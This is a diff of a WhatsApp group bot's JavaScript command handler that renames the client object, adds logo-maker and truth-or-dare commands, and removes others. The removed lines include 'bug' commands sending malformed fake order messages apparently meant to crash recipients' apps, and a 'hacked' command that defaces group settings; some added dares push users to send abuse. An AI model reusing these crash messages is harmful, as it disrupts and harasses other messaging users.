-              itsmevall.sendMessage(from, media, image, {
+              client.sendMessage(from, media, image, {
                 contextInfo: { mentionedJid: [sender] },
                 caption: teks,
               });
@@ -2253,8 +1837,8 @@ Reminder activated successfully!
         } else if (isQuotedAudio) {
           encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
             .message.extendedTextMessage.contextInfo;
-          media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
-          await itsmevall.sendMessage(
+          media = await client.downloadAndSaveMediaMessage(encmedia);
+          await client.sendMessage(
             from,
             `── 「 REMINDER 」 ──
     
@@ -2272,7 +1856,7 @@ Reminder activated successfully!
           const intervRemind = setInterval(async () => {
             if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
               anu = await reminder.getReminderMsg(sender, _reminder);
-              itsmevall.sendMessage(
+              client.sendMessage(
                 from,
                 `── 「 REMINDER 」 ──
 
@@ -2282,7 +1866,7 @@ Reminder activated successfully!
                 text,
                 { contextInfo: { mentionedJid: [sender] } }
               );
-              itsmevall.sendMessage(from, fs.readFileSync(media), audio, {
+              client.sendMessage(from, fs.readFileSync(media), audio, {
                 contextInfo: { mentionedJid: [sender] },
                 mimetype: "audio/mp4",
                 ptt: true,
@@ -2301,128 +1885,12 @@ Reminder activated successfully!
           }, 1000);
         }
         break;
-case 'hacked':
-  if (!mek.key.fromMe) return;
-              if (!isGroup) return reply(mess.only.group)
-              if (args.length < 1) return reply('The text?')
-              reply('Auto Hack')
-                tessgc = await getBuffer(`https://i.ibb.co/m4Qx3JG/20210319-204838.jpg`)
-                   itsmevall.updateProfilePicture (from, tessgc)
-                   await sleep(1000)
-                itsmevall.groupUpdateSubject(from, `HACKED BY ${body.slice(8)}`)
-                await sleep(1000)
-                itsmevall.groupUpdateDescription(from, `_${pushname} telah meretas grup ini_`)             
-                await sleep(1000)
-                itsmevall.sendMessage(from, 'Succes Hacked', text, {quoted: fyt})
-case 'ytgw':
-  reply('https://youtube.com/channel/UCvAo9TZ0Pw9vrJ_0WYRyO3A')
-					break;
-   case 'ss':
-      reply(mess.wait)
-					sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/ssweb?url=${args[0]}&apikey=${HunterApi}`, `Ni Kak`)
-					break
-case 'treasure':
-  reply(mess.wait)
-  sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/chartatahta?text=${args[0]}&apikey=${HunterApi}`, `Ni 🗿`)
-  break
- case '+91':
-reply(mess.wait)
-sendMediaURL(from,`https://itsmevall.herokuapp.com/api/asupan?apikey=${valkey}`, `Ni Kak`)
- break
-case 'santuy':
-reply(mess.wait)
-sendMediaURL(from,`https://dapuhy-api.herokuapp.com/api/asupan/asupansantuy?apikey=${dapapi}`, `Ni Kak ${pushname}`)
-break
-case 'leaky':
-reply(mess.wait)
-sendMediaURL(from,`https://dapuhy-api.herokuapp.com/api/asupan/asupanbocil?apikey=${dapapi}`, `Ni Kak ${pushname}`)
-break
-case 'ukhti':
-reply(mess.wait)
-sendMediaURL(from,`https://dapuhy-api.herokuapp.com/api/asupan/asupanukhty?apikey=${dapapi}`, `Ni Kak ${pushname}`)
-break
-case 'rikagusriani':
-reply(mess.wait)
-sendMediaURL(from,`https://dapuhy-api.herokuapp.com/api/asupan/asupanrikagusriani?apikey=${dapapi}`, `Ni Kak ${pushname}`)
-break
-case 'ghea':
-reply(mess.wait)
-sendMediaURL(from,`https://dapuhy-api.herokuapp.com/api/asupan/asupanghea?apikey=${dapapi}`, `Ni Kak ${pushname}`)
-break
-
-case 'size':
-if (args.length < 1) return reply('Enter the numbers')
-filsize = args[0]
-costick = await itsmevall.prepareMessageFromContent(from,{
-"stickerMessage": {
-"url": m.quoted.url,
-"fileSha256": m.quoted.fileSha256.toString('base64'),
-"fileEncSha256": m.quoted.fileEncSha256.toString('base64'),
-"mediaKey": m.quoted.mediaKey.toString('base64'),
-"mimetype": m.quoted.mimetype,
-"height": m.quoted.height,
-"width": m.quoted.width,
-"directPath": m.quoted.directPath,
-"fileLength": filsize,
-"mediaKeyTimestamp": m.quoted.mediaKeyTimestamp.low,
-"isAnimated": m.quoted.isAnimated
-}
-}, {quoted:fgif})
-itsmevall.relayWAMessage(costick)
-break
-
-case 'sizeimg':
-if (args.length < 1) return reply('Enter the numbers')
-filsizei = args[0]
-costick3 = await itsmevall.prepareMessageFromContent(from,{
-"imageMessage": {
-	"url": m.quoted.url,
-	"mimetype": m.quoted.mimetype,
-	"caption": m.quoted.caption,
-	"fileSha256": m.quoted.fileSha256.toString('base64'),
-	"fileLength": filsizei,
-	"height": m.quoted.height,
-	"width": m.quoted.width,
-	"mediaKey": m.quoted.mediaKey.low,
-	"jpegThumbnail": m.quoted.jpegThumbnail
-}
-}, {quoted:ftroli})
-itsmevall.relayWAMessage(costick3)
-break
-//// bug 
-					case 'bugpc2':
-  if (!mek.key.fromMe) return;
-if (args.length < 1) return reply('Amount?')
-for (let i = 0; i < args[0]; i++) {
-itsmevall.sendMessage(from, `${ucapanWaktu}`, MessageType.extendedText,{
- quoted: {
-key: {
-participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
-},
-message: {
-orderMessage: {
-itemCount: 99999999,
-status: 1,
-surface: 10,
-orderTitle: `${fake}`,
-sellerJid: '0@s.whatsapp.net'
-}}}}, 0)
-}
-break
-					case 'bug':
-  if (!mek.key.fromMe) return;
-					if (args.length < 1) return reply('The amount?')
-				 for (let i = 0; i < args[0]; i++) {
-await itsmevall.toggleDisappearingMessages(from, 0)
-}
-reply('Successfully send as many bugs '+args.join(' '))
-					break;
-      case "rentbot":
-        if (!mek.key.fromMe) return reply("Cant be a bot in a bot");
-        jadibot(reply, itsmevall, from);
+      case "jadibot":
+        if (mek.key.fromMe) return reply("Cant be a bot in a bot");
+        jadibot(reply, client, from);
         break;
-      case "stoprentbot":
-        if (!mek.key.fromMe)
+      case "stopjadibot":
+        if (mek.key.fromMe)
           return reply("cant stop being bot except the owner");
         stopjadibot(reply);
         break;
@@ -2430,7 +1898,7 @@ reply('Successfully send as many bugs '+args.join(' '))
         let tekss = "「 *LIST JADIBOT* 」\n";
         for (let i of listjadibot) {
           tekss += `*Number* : ${i.jid.split("@")[0]}
-*Nama* : ${i.name}
+*Name* : ${i.name}
 *Device* : ${i.phone.device_manufacturer}
 *Model* : ${i.phone.device_model}\n\n`;
         }
@@ -2462,249 +1930,7 @@ reply('Successfully send as many bugs '+args.join(' '))
           ]
         );
         break;
-	case 'chat':
-			if (args[0].startsWith('08')) return reply('Prefix number with 91')
-            if (args[0].startsWith('+62')) return reply('Start number with 91')
-			if (args.length < 1) return reply(`Use ${prefix}chat 91xx|text`)
-            var pc = body.slice(6)
-            var nomor = pc.split("|")[0];
-            var org = pc.split("|")[1];
-            itsmevall.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)   
-            reply(`Success in sending chat:\n${org},@${nomor}`)
-            break
-case 'viewonce':
-res = await itsmevall.prepareMessageFromContent(from,{
-"viewOnceMessage": {
-"message": {
-"imageMessage": {
-"mimetype": 'image/jpeg',
-"jpegThumbnail": iye,
-"viewOnce": true
-}
-}
-}
-}, {}) 
-itsmevall.relayWAMessage(res)
-break
-case 'bugcombine':
-  if (!mek.key.fromMe) return;
- reply(mess.only.ownerB)
-                 itsmevall.toggleDisappearingMessages(from, 'HACKED')
-itsmevall.sendMessage(from, `${fakeyoi}`, text, {
- quoted: {
-  key: {
-   participant: '0@s.whatsapp.net' // Fake sender Jid
-  },
-  message: {
-   orderMessage: {
-    itemCount: 9999999, // Bug
-    status: 1,
-    surface: 1,
-    message: `${fakeyoi}`,
-    orderTitle: `${fakeyoi}`, // Idk what this does
-    sellerJid: '0@s.whatsapp.net' // Seller
-   }
-  }
- }
-})
-setTimeout( () => {
-	    itsmevall.updatePresence(from, Presence.composing)
-	    sendMess(`dahlah`)
-	    }, 2000)
-	    reply(`dahlah`)
-break
-case 'bugloc':
-if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
-itsmevall.updatePresence(from, Presence.composing)
-		       itsmevall.sendMessage(from, {degreesLatitude: 34.0184,
-						degreesLongitude: -118.411,
-						name: `${fakeyoi}`,
-						address: `${fakeyoi}`,
-                        jpegThumbnail: iye },location,{
- quoted: {
-  key: {
-   participant: '111111111@s.whatsapp.net' // Fake sender Jid
-  },
-  message: {
-   orderMessage: {
-    itemCount: 70000, // Bug
-    status: 1,
-    surface: 1,
-    message: `${fakeyoi}`,
-    orderTitle: `${fakeyoi}`, // 
-    sellerJid: '0@s.whatsapp.net' // Seller
-   }
-  }
- }
-})
-break
-case 'bugpc':
-					case 'bugpc':
-  if (!mek.key.fromMe) return;
-itsmevall.updatePresence(from, Presence.composing)
-itsmevall.sendMessage(from, 'okay okay',text, {
- quoted: {
-  key: {
-   participant: '1111111111@s.whatsapp.net' // Fake sender Jid
-  },
-  message: {
-   orderMessage: {
-    itemCount: 70000, // Bug
-    status: 1,
-    surface: 1,
-    message: `${fakeyoi}`,
-    orderTitle: `${fakeyoi}`, // 
-    sellerJid: '0@s.whatsapp.net' // Seller
-   }
-  }
- }
-})
-break
-case 'hbd': case 'zodiak': case 'zodiac':
-let textus = args.join(" ")
-if (!q) return reply(`Example : ${prefix + command} 2003 01 24`)
-const zodiak = [
-    ["Capricorn",   new Date(1970, 0, 1)],
-    ["Aquarius",    new Date(1970, 0, 20)],
-    ["Pisces",      new Date(1970, 1, 19)],
-    ["Aries",       new Date(1970, 2, 21)],
-    ["Taurus",      new Date(1970, 3, 21)],
-    ["Gemini",      new Date(1970, 4, 21)],
-    ["Cancer",      new Date(1970, 5, 22)],
-    ["Leo",         new Date(1970, 6, 23)],
-    ["Virgo",       new Date(1970, 7, 23)],
-    ["Libra",       new Date(1970, 8, 23)],
-    ["Scorpio",     new Date(1970, 9, 23)],
-    ["Sagittarius", new Date(1970, 10, 22)],
-    ["Capricorn",   new Date(1970, 11, 22)]
-].reverse()
-
-function getZodiac(month, day) {
-let d = new Date(1970, month - 1, day)
-return zodiak.find(([_,_d]) => d >= _d)[0]
-}
-const okbg = new Date(textus)
-if (okbg == 'Invalid Date') throw date
-const d = new Date()
-const [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
-const birth = [okbg.getFullYear(), okbg.getMonth() + 1, okbg.getDate()]
-    
-const zodiac = getZodiac(birth[1], birth[2])
-const ageD = new Date(d - date)
-const age = ageD.getFullYear() - new Date(1970, 0, 1).getFullYear()
-
-const birthday = [tahun + (birth[1] < bulan), ...birth.slice(1)]
-const cekusia = bulan === birth[1] && tanggal === birth[2] ? `Happy -${age}th Birthday 🥳🎉` : age
-
-const teksh = `
-Birth : ${birth.join('-')}
-Upcoming hbd : ${birthday.join('-')}
-Age : ${cekusia}
-Zodiac : ${zodiac}
-`.trim()
-reply(monospace(teksh))
-break
-// debug
-  case 'debug':
-			 res = await itsmevall.prepareMessageFromContent(from,{
-"templateMessage": {
-						"hydratedTemplate": {
-							"hydratedContentText": `Hi ${pushname} 👋,`,
-							"hydratedFooterText": `${fakeyoi}`,
-							"hydratedButtons": [
-								{
-									"quickReplyButton": {
-										"displayText": "List Menu",
-										"id": "60dd75b0081979507a679f99"
-									},
-									"index": 0
-								},
-								{
-									"quickReplyButton": {
-										"displayText": "Script",
-										"id": "60dd75b0081979507a679f99"
-									},
-									"index": 1
-								},
-								{
-									"quickReplyButton": {
-										"displayText": "Instagram",
-										"id": "60dd75b0081979507a679f99"
-									},
-									"index": 2
-								}
-							]
-						}
-					}
-				}, {}) 
-itsmevall.relayWAMessage(res)
-break
-case 'debug2':
-   res = await itsmevall.prepareMessageFromContent(from,{
-"templateMessage": {
-  "hydratedFourRowTemplate": {
-    "hydratedContentText": "",
-    "hydratedFooterText": "",
-    "hydratedButtons": [
-      {
-        "urlButton": {
-          "displayText": "",
-          "url": ""
-        },
-        "index": 0
-      }
-    ]
-  },
-  "hydratedTemplate": {
-    "hydratedContentText": `Hi ${pushname} 👋,`,
-    "hydratedFooterText": `${fakeyoi}`,
-    "hydratedButtons": [
-      {
-        "urlButton": {
-          "displayText": `Script ${fakeyoi}`,
-          "url": "https://github.com/DGXeon"
-        },
-        "index": 0
-      }
-    ]
-  }
-}
-}, {})
-itsmevall.relayWAMessage(res)
-break
-				
-   /*switch (command) {*/
-        /*case 'asupan':
-          var menulist = itsmevall.prepareMessageFromContent(from, {
-            "listMessage" :{
-              "title": `${ucapanWaktu} kak ${pushname}\n this is my bot :v`,
-              "description": `bot ini berjalan selama \n${runtime(process.uptime())}`,
-              "buttonText": "click here👈",
-              /*"footerText": '@WinBellz',
-              "listType": "SINGLE_SELECT",
-              "sections": [{
-              "footerText": '@WinBell',
-                "title": `Prefix Bot :「 ${prefixStatus ? "Multi Prefix" : "No Prefix"} 」`,
-                "rows": [{
-                    "title": "+91",
-                    "rowId": "0",
-                    "description": ""
-                  },{
-                    "title": "intake",
-                    "rowId": "1",
-                    "description": ""
-                  },{
-                    "title": "intake",
-                    "rowId": "2",
-                    "description": ""
-                  }]
-              }]
-            }
-          }, {})
-          itsmevall.relayWAMessage(menulist, {waitForAck: true})*/
-              
-                 break
-			      case "mode":
+      case "mode":
         if (!mek.key.fromMe) return;
         sendButMessage(from, `MODE SELF/PUBLIC`, `Please choose one`, [
           {
@@ -2723,84 +1949,9 @@ break
           },
         ]);
         break;
-case "intake": // by xeon
-        sendButMessage(from, `Hi bro ${pushname} 🐤`, `Please select your intake sis✨`, [
-          {
-            buttonId: `${prefix}+91`,
-            buttonText: {
-              displayText: `🔖 intake +91`,
-            },
-            type: 1,
-          },
-          {
-            buttonId: `${prefix}ghea`,
-            buttonText: {
-              displayText: `🔖 Ghea intake`,
-            },
-            type: 1,
-          },
-          {
-            buttonId: `${prefix}intake2`,
-            buttonText: {
-              displayText: `Next Intake >`,
-            },
-            type: 1,
-          },
-        ]);
-        break;
-case "intake2": // by xeon
-        sendButMessage(from, `Hi bro ${pushname} 🐤`, `Please select the intake V.2 sis✨`, [
-          {
-            buttonId: `${prefix}santuy`,
-            buttonText: {
-              displayText: `🔖 Intake of Santuy`,
-            },
-            type: 1,
-          },
-          {
-            buttonId: `${prefix}leaky`,
-            buttonText: {
-              displayText: `🔖 Small intake`,
-            },
-            type: 1,
-          },
-          {
-            buttonId: `${prefix}intake3`,
-            buttonText: {
-              displayText: `Next Intake >`,
-            },
-            type: 1,
-          },
-        ]);
-        break;
-case "asupan3": // by xeon
-        sendButMessage(from, `Hi bro ${pushname} 🐤`, `Please select the intake V.3 sis✨`, [
-          {
-            buttonId: `${prefix}rikagusriani`,
-            buttonText: {
-              displayText: `🔖 Rikagusriani intake`,
-            },
-            type: 1,
-          },
-          {
-            buttonId: `${prefix}ukhti`,
-            buttonText: {
-              displayText: `🔖 Ukhti intake`,
-            },
-            type: 1,
-          },
-          {
-            buttonId: `${prefix}ytgw`,
-            buttonText: {
-              displayText: `SUBSCRIBE MY CHANEL BRO🤗`,
-            },
-            type: 1,
-          },
-        ]);
-        break;
       case "grup":
         if (!mek.key.fromMe) return;
-        sendButMessage(from, `GROUP SETTING`, `Please choose one`, [
+        sendButMessage(from, `GROUP SETTING`, `Silahkan pilih salah satu`, [
           {
             buttonId: `${prefix}opengc`,
             buttonText: {
@@ -2824,8 +1975,206 @@ case "asupan3": // by xeon
           },
         ]);
         break;
+        //----------< Maker Features >------------
+        case "wolf":
+                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} Xeon*`)
+                   F = body.slice(6)
+                   reply(mess.wait)
+                   anu = await getBuffer(`${ApiZeks}/api/wolflogo?apikey=${zeksApikey}&text1=zeeoneofc&text2=${F}`)
+                   client.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nPlease Subscribe Xeon`, quoted: mek})
+                   break;
+         case "tfire":  
+                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} Xeon*`)
+                   F = body.slice(7)
+                   reply(mess.wait)
+                   anu = await getBuffer(`${ApiZeks}/api/tfire?text=${F}&apikey=${zeksApikey}`)                   
+                   client.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nAb bolo mast hai ki nahi? `, quoted: mek})
+                   break;               
+       case "ytgold":  
+                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} Xeon*`)
+                   F = body.slice(8)
+                   reply(mess.wait)
+                   anu = await getBuffer(`${ApiZeks}/api/gplaybutton?text=${F}&apikey=${zeksApikey}`)
+                   client.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nAb bolo mast hai ki nahi? `, quoted: mek})
+                   break;
+       case "ytsilver":
+                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} Xeon*`)
+                   F = body.slice(10)
+                   reply(mess.wait)
+                   anu = await getBuffer(`${ApiZeks}/api/splaybutton?text=${F}&apikey=${zeksApikey}`)
+                   client.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nAb bolo mast hai ki nahi? `, quoted: mek})
+                   break;
+       case "t3d":
+                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} Xeon*`)
+                   F = body.slice(5)
+                   reply(mess.wait)
+                   anu = await getBuffer(`${ApiZeks}/api/text3dbox?apikey=${zeksApikey}&text=${F}`)
+                   client.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nAb bolo mast hai ki nahi? `, quoted: mek})
+                   break;
+       case "logoa":
+                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} Xeon&lol*`)
+                   var F = body.slice(7)
+				   var F1 = F.split("&")[0];
+				   var F2 = F.split("&")[1]; 
+                   reply(mess.wait)
+                   anu = await getBuffer(`${ApiZeks}/api/logoaveng?text1=${F1}&text2=${F2}&apikey=${zeksApikey}`)
+                   client.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nAb bolo mast hai ki nahi? `, quoted: mek})
+                   break;
+       case "phlogo":  
+                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} Xeon&lol*`)
+                   var F = body.slice(9)
+				   var F1 = F.split("&")[0];
+				   var F2 = F.split("&")[1]; 
+                   reply(mess.wait)
+                   anu = await getBuffer(`${ApiZeks}/api/phlogo?text1=${F1}&text2=${F2}&apikey=${zeksApikey}`)
+                   client.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nAb bolo mast hai ki nahi? `, quoted: mek})
+                   break;
+       case "marvel":
+                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} Xeon&lol*`)
+                   var F = body.slice(8)
+				   var F1 = F.split("&")[0];
+				   var F2 = F.split("&")[1]; 
+                   reply(mess.wait)
+                   anu = await getBuffer(`${ApiZeks}/api/marvellogo?text1=${F1}&text2=${F2}&apikey=${zeksApikey}`)
+                   client.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nAb bolo mast hai ki nahi? `, quoted: mek})
+                   break;
+       case "leavest":  
+                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} Xeon*`)
+                   F = body.slice(9)
+                   reply(mess.wait)
+                   anu = await getBuffer(`${ApiZeks}/api/leavest?text=${F}&apikey=${zeksApikey}`)
+                   client.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nAb bolo mast hai ki nahi? `, quoted: mek})
+                   break;                    
+       case "write":
+                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} Xeon*`)
+                   F = body.slice(7)
+                   reply(mess.wait)
+                   anu = await getBuffer(`${ApiZeks}/api/nulis?text=${F}&apikey=${zeksApikey}`)
+                   client.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nAb bolo mast hai ki nahi? `, quoted: mek})
+                   break;
+       case "neon":
+                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} Xeon*`)
+                   F = body.slice(7)
+                   reply(mess.wait)
+                   anu = await getBuffer(`${ApiZeks}/api/bneon?apikey=${zeksApikey}&text=${F}`)
+                   client.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nAb bolo mast hai ki nahi? `, quoted: mek})
+                   break;                    
+       case "wall":
+                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} Xeon*`)
+                   F = body.slice(6)
+                   reply(mess.wait)
+                   anu = await getBuffer(`${ApiZeks}/api/breakwall?apikey=${zeksApikey}&text=${F}`)
+                   client.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nAb bolo mast hai ki nahi!`, quoted: mek})
+                   break;
+                   case "phcomment":
+                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} xeon&lol*`)
+                   var F = body.slice(10)
+				   var F1 = F.split("&")[0];
+				   var F2 = F.split("&")[1]; 
+                   reply(mess.wait)
+                   anu = await getBuffer(`${ApiZeks}/api/phub?apikey=${zeksApikey}&img=https://1.bp.blogspot.com/-x8KhcOBG-yw/XiU4pi1yWVI/AAAAAAAADBA/gK8tsLyc1lQ808A348IKzDCjf6fUBKONwCLcBGAsYHQ/s1600/cara%2Bbuat%2Bfoto%2Bprofil%2Bdi%2Bwhatsapp%2Bmenjadi%2Bunik.jpg&username=${F1}&msg=${F2}`)
+                  client.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nAb bolo mast hai ki nahi?`, quoted: mek})
+                   break;
+              //------------------< Fun features >-------------------
+              case "tictactoe":
+              case "truth":
+					// source code by xeon⛔
+                 if (!isGroup) return reply( mess.only.group);
+					const trut =['What song do you sing most in the shower','Have you ever had a near-death experience','When was the last time you were really angry.. Why','Who is the last person who called you','Do you have any hidden talents. What are they','What word do you hate the most','What is the last YouTube video you watched','What is the last thing you Googled','Who in this group would you want to swap lives with for a week','What is the scariest thing thats ever happened to you','Have you ever farted and blamed it on someone else','When is the last time you made someone else cry','Have you ever ghosted a friend','Have you ever seen a dead body','Which of your family members annoys you the most and why','If you had to delete one app from your phone, which one would it be','What app do you waste the most time on','Have you ever faked sick to get home from school','What is the most embarrassing item in your room','What five items would you bring if you got stuck on a desert island','Have you ever laughed so hard you peed your pants','Do you smell your own farts','have u ever peed on the bed while sleeping 🤣🤣','What is the biggest mistake you have ever made','Have you ever cheated in an exam','What is the worst thing you have ever done','When was the last time you cried','whom do you love the most among ur parents','do u sometimes put ur finger in ur nosetril🤣','who was ur crush during the school days','tell honestly, do u like any boy in this grup','have you ever liked anyone? how long?','do you have gf/bf','what is your biggest fear?','have you ever liked someone and felt that person likes you too?','What is the name of your ex-boyfriend of your friend that you once liked quietly?','ever did you steal your mothers money or your fathers money','what makes you happy when you are sad','do you like someone who is in this grup? if you then who?','have you ever been cheated on by people?','the most feared thing','who is the most important person in your life','what proud things did you get this year','who is the person who can make you happy when u r sad','who is the person who ever made you feel uncomfortable','have you ever lied to your parents','do you still like ur ex','who do you like to play together with?','have you ever stolen big thing in ur life? the reason why?','Mention the incident that makes you hurt that you still remember','what achievements have you got this year?','what was your worst habit at school?','do you love the bot creator, xeon?•','have you ever thought of taking revenge from ur teacher?','do you like current prime minister of ur country','you non veg or veg','if you could be invisible, what is the first thing you would do','what is a secret you kept from your parents','Who is your secret crush','whois the last person you creeped on social media','If a genie granted you three wishes, what would you ask for','What is your biggest regret','What animal do you think you most look like','How many selfies do you take a day','What was your favorite childhood show','if you could be a fictional character for a day, who would you choose','whom do you text the most','What is the biggest lie you ever told your parents','Who is your celebrity crush','Whats the strangest dream you have ever had','do you play pubg, if you then send ur id number']
+					const ttrth = trut[Math.floor(Math.random() * trut.length)]
+					truteh = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
+					client.sendMessage(from, truteh, image, { caption: '*Truth (juth bolenge to paap lagega)*\n\n'+ ttrth, quoted: mek })
+					break;
+					case "dare":
+					// source code by xeon⛔
+                 if (!isGroup) return reply( mess.only.group);
+					const dare =['Act like a chicken in front of ur parents','Pick up a random book and read one page out loud in a ','Open your front door and howl like a wolf for 10 seconds','Take an embarrassing selfie and paste it on your profile picture','Let the group choose a word and a well-known song. You have to sing that song and send it in voice note','Walk on your elbows and knees for as long as you can','sing national anthem in voice note','Breakdance for 30 seconds in the sitting room🤣','Tell the saddest story you know','make a twerk dance video and put it on status for 5mins','Eat a raw piece of garlic','Show the last five people you texted and what the messages said','put your full name on status for 5hrs','make a short dance video without any filter just with a music and put it on ur status for 5hrs','call ur bestie, bitch','put your photo without filter on ur status for 10mins','say i love oli london in voice note🤣🤣','Send a message to your ex and say I still like you','call Crush/girlfriend/bestie now and screenshot here','pop to one of the group member personal chat and Say you ugly bustard','say YOU ARE BEAUTIFUL/HANDSOME to one of person who is in top of ur pinlist or the first person on ur chatlist','send voice notes and say, can i call u baby, if u r boy tag girl/if girl tag boy','write i love you (random grup member name, who is online) in personal chat, (if u r boy write girl name/if girl write boy name) take a snap of the pic and send it here','use any bollywood actor photo as ur pfp for 3 days','put your crush photo on status with caption, this is my crush','change name to I AM GAY for 5 hours','chat to any contact in whatsapp and say i will be ur bf/gf for 5hours','send voice note says i hv crush on you, want to be my girlfriend/boyfriend or not? to any random person from the grup(if u girl choose boy, if boy choose girl','slap ur butt hardly send the sound of slap through voice note😂','state ur gf/bf type and send the photo here with caption, ugliest girl/boy in the world','shout bravooooooooo and send here through voice note','snap your face then send it here','Send your photo with a caption, i am lesbian','shout using harsh words and send it here through vn','shout you bastard in front of your mom/papa','change the name to i am idiot for 24 hours','slap urself firmly and send the sound of slap through voice note😂','say i love the bot owner xeon through voice note','send your gf/bf pic here','make any tiktok dance challenge video and put it on status, u can delete it after 5hrs',' breakup with your best friend for 5hrs without telling him/her that its a dare','tell one of your frnd that u love him/her and wanna marry him/her, without telling him/her that its a dare','say i love depak kalal through voice note','write i am feeling horny and put it on status, u can delete it only after 5hrs','write i am lesbian and put it on status, u can delete only after 5hrs',' kiss your mommy or papa and say i love you😌','put your father name on status for 5hrs','send abusive words in any grup, excepting this grup, and send screenshot proof here']
+					const der = dare[Math.floor(Math.random() * dare.length)]
+					truteh = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
+					client.sendMessage(from, truteh, image, { quoted: mek, caption: '*Dare (nhi karenge to paap lagega)*\n\n'+ der })
+					break;
+					                case "uglycheck":
+					// source code by xeon⛔
+                 if (!isGroup) return reply( mess.only.group);
+					sange = body.slice(1)
+					const sang =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
+					const nge = sang[Math.floor(Math.random() * sang.length)]
+					client.sendMessage(from, 'Question : *'+sange+'*\n\nAnswer: '+ nge+'%', text, { quoted: mek })
+					break;
+                case "gaycheck":
+					// source code by xeon⛔
+                 if (!isGroup) return reply( mess.only.group);
+					gayy = body.slice(1)
+					const gay =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
+					const yag = gay[Math.floor(Math.random() * gay.length)]
+					client.sendMessage(from, 'Question : *'+gayy+'*\n\nAnswer : '+ yag+'%', text, { quoted: mek })
+					break;
+                case 'lesbiancheck':
+					// source code by xeon⛔
+                 if (!isGroup) return reply( mess.only.group);
+					lesbii = body.slice(1)
+					const lesbi =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
+					const bi = lesbi[Math.floor(Math.random() * lesbi.length)]
+					client.sendMessage(from, 'Question : *'+lesbii+'*\n\nAnswer : '+ bi+'%', text, { quoted: mek })
+					break;
+                case 'handsomecheck':
+					// source code by xeon⛔
+                 if (!isGroup) return reply( mess.only.group);
+					ganteng = body.slice(1)
+					const gan =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
+					const teng = gan[Math.floor(Math.random() * gan.length)]
+					client.sendMessage(from, 'Question : *'+ganteng+'*\n\nAnswer : '+ teng+'%', text, { quoted: mek })
+					break;
+		case "beautifulcheck":
+					// source code by xeon⛔
+                 if (!isGroup) return reply( mess.only.group);
+					cantik = body.slice(1)
